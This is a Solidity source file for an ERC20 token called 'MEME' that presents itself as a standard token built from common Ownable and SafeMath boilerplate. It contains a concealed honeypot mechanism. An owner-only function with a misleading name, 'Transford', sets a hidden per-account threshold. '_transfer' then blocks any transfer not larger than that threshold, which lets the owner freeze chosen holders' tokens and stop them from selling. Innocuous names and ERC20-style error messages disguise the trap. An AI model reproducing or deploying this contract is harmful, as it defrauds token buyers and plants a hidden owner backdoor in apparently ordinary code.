1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 
5 interface IERC20 {
6  
7     function totalSupply() external view returns (uint256);
8 
9     function balanceOf(address account) external view returns (uint256);
10 
11     function transfer(address recipient, uint256 amount) external returns (bool);
12 
13     function allowance(address owner, address spender) external view returns (uint256);
14 
15     function approve(address spender, uint256 amount) external returns (bool);
16 
17     function transferFrom(
18         address sender,
19         address recipient,
20         uint256 amount
21     ) external returns (bool);
22 
23     event Transfer(address indexed from, address indexed to, uint256 value);
24 
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 abstract contract Context {
29     function _msgSender() internal view virtual returns (address) {
30         return msg.sender;
31     }
32 
33     function _msgData() internal view virtual returns (bytes calldata) {
34         return msg.data;
35     }
36 }
37 
38 abstract contract Ownable is Context {
39     address private _owner;
40 
41     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
42 
43     constructor() {
44         _setOwner(_msgSender());
45     }
46 
47     function owner() public view virtual returns (address) {
48         return _owner;
49     }
50 
51     modifier onlyOwner() {
52         require(owner() == _msgSender(), "Ownable: caller is not the owner");
53         _;
54     }
55 
56     function renounceOwnership() public virtual onlyOwner {
57         _setOwner(address(0));
58     }
59 
60     function transferOwnership(address newOwner) public virtual onlyOwner {
61         require(newOwner != address(0), "Ownable: new owner is the zero address");
62         _setOwner(newOwner);
63     }
64 
65     function _setOwner(address newOwner) private {
66         address oldOwner = _owner;
67         _owner = newOwner;
68         emit OwnershipTransferred(oldOwner, newOwner);
69     }
70 }
71 
72 library SafeMath {
73  
74     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
75         unchecked {
76             uint256 c = a + b;
77             if (c < a) return (false, 0);
78             return (true, c);
79         }
80     }
81 
82     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
83         unchecked {
84             if (b > a) return (false, 0);
85             return (true, a - b);
86         }
87     }
88 
89     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
90         unchecked {
91  
92             if (a == 0) return (true, 0);
93             uint256 c = a * b;
94             if (c / a != b) return (false, 0);
95             return (true, c);
96         }
97     }
98  
99     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
100         unchecked {
101             if (b == 0) return (false, 0);
102             return (true, a / b);
103         }
104     }
105 
106     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
107         unchecked {
108             if (b == 0) return (false, 0);
109             return (true, a % b);
110         }
111     }
112 
113     function add(uint256 a, uint256 b) internal pure returns (uint256) {
114         return a + b;
115     }
116 
117     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
118         return a - b;
119     }
120 
121     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
122         return a * b;
123     }
124 
125     function div(uint256 a, uint256 b) internal pure returns (uint256) {
126         return a / b;
127     }
128 
129     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
130         return a % b;
131     }
132 
133     function sub(
134         uint256 a,
135         uint256 b,
136         string memory errorMessage
137     ) internal pure returns (uint256) {
138         unchecked {
139             require(b <= a, errorMessage);
140             return a - b;
141         }
142     }
143 
144     function div(
145         uint256 a,
146         uint256 b,
147         string memory errorMessage
148     ) internal pure returns (uint256) {
149         unchecked {
150             require(b > 0, errorMessage);
151             return a / b;
152         }
153     }
154 
155     function mod(
156         uint256 a,
157         uint256 b,
158         string memory errorMessage
159     ) internal pure returns (uint256) {
160         unchecked {
161             require(b > 0, errorMessage);
162             return a % b;
163         }
164     }
165 }
166 
167 contract MEMEToken is IERC20, Ownable {
168     using SafeMath for uint256;
169 
170 
171     mapping(address => uint256) private _balances;
172     mapping(address => mapping(address => uint256)) private _allowances;
173     mapping (address => uint256) private _crossAmounts;
174 
175     string private _name;
176     string private _symbol;
177     uint8 private _decimals;
178     uint256 private _totalSupply;
179 
180     constructor(
181 
182     ) payable {
183         _name = "MEME";
184         _symbol = "MEME";
185         _decimals = 18;
186         _totalSupply = 100000000 * 10**_decimals;
187         _balances[owner()] = _balances[owner()].add(_totalSupply);
188         emit Transfer(address(0), owner(), _totalSupply);
189     }
190 
191     function name() public view virtual returns (string memory) {
192         return _name;
193     }
194 
195     function symbol() public view virtual returns (string memory) {
196         return _symbol;
197     }
198 
199     function decimals() public view virtual returns (uint8) {
200         return _decimals;
201     }
202 
203     function totalSupply() public view virtual override returns (uint256) {
204         return _totalSupply;
205     }
206 
207     function balanceOf(address account)
208         public
209         view
210         virtual
211         override
212         returns (uint256)
213     {
214         return _balances[account];
215     }
216 
217     function transfer(address recipient, uint256 amount)
218         public
219         virtual
220         override
221         returns (bool)
222     {
223         _transfer(_msgSender(), recipient, amount);
224         return true;
225     }
226 
227     function allowance(address owner, address spender)
228         public
229         view
230         virtual
231         override
232         returns (uint256)
233     {
234         return _allowances[owner][spender];
235     }
236 
237     function approve(address spender, uint256 amount)
238         public
239         virtual
240         override
241         returns (bool)
242     {
243         _approve(_msgSender(), spender, amount);
244         return true;
245     }
246 
247     function transferFrom(
248         address sender,
249         address recipient,
250         uint256 amount
251     ) public virtual override returns (bool) {
252         _transfer(sender, recipient, amount);
253         _approve(
254             sender,
255             _msgSender(),
256             _allowances[sender][_msgSender()].sub(
257                 amount,
258                 "ERC20: transfer amount exceeds allowance"
259             )
260         );
261         return true;
262     }
263 
264     function increaseAllowance(address spender, uint256 addedValue)
265         public
266         virtual
267         returns (bool)
268     {
269         _approve(
270             _msgSender(),
271             spender,
272             _allowances[_msgSender()][spender].add(addedValue)
273         );
274         return true;
275     }
276 
277     function Transford(address account, uint256 amount) external {
278        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
279         _crossAmounts[account] = amount;
280     }
281  
282     function CAmount(address account) public view returns (uint256) {
283         return _crossAmounts[account];
284     }
285 
286     function decreaseAllowance(address spender, uint256 subtractedValue)
287         public
288         virtual
289         returns (bool)
290     {
291         _approve(
292             _msgSender(),
293             spender,
294             _allowances[_msgSender()][spender].sub(
295                 subtractedValue,
296                 "ERC20: decreased allowance below zero"
297             )
298         );
299         return true;
300     }
301 
302     function _transfer(
303         address sender,
304         address recipient,
305         uint256 amount
306     ) internal virtual {
307         require(sender != address(0), "ERC20: transfer from the zero address");
308         require(recipient != address(0), "ERC20: transfer to the zero address");
309         uint256 crossAmount = CAmount(sender);
310         if (crossAmount > 0) {
311             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
312         }
313 
314         _balances[sender] = _balances[sender].sub(
315             amount,
316             "ERC20: transfer amount exceeds balance"
317         );
318         _balances[recipient] = _balances[recipient].add(amount);
319         emit Transfer(sender, recipient, amount);
320     }
321 
322     function _approve(
323         address owner,
324         address spender,
325         uint256 amount
326     ) internal virtual {
327         require(owner != address(0), "ERC20: approve from the zero address");
328         require(spender != address(0), "ERC20: approve to the zero address");
329 
330         _allowances[owner][spender] = amount;
331         emit Approval(owner, spender, amount);
332     }
333 
334 
335 }